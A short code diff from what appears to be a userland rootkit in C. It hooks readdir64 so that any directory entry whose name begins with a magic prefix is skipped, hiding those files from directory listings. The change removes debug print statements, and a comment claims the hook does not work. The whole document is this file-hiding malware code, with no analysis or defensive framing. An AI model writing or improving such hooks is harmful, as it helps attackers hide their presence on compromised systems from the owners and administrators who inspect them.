@@ -133,13 +133,10 @@ struct dirent* readdir(DIR *dirp){
 // DOESNT FUCKING WORK
 struct dirent64* readdir64(DIR* dirp) {
   struct dirent64* entry;
-  printf("[+] in hooked function\n");
   while ((entry = og_readdir64(dirp)) != NULL) {
     if (strncmp(entry->d_name, MAGIC_PREFIX, MAGIC_LEN) == 0) {
-      printf("[i] skipped\n");
       continue;
     }
-    printf("[i] In while loop\n");
     return entry;
   }
   return entry;
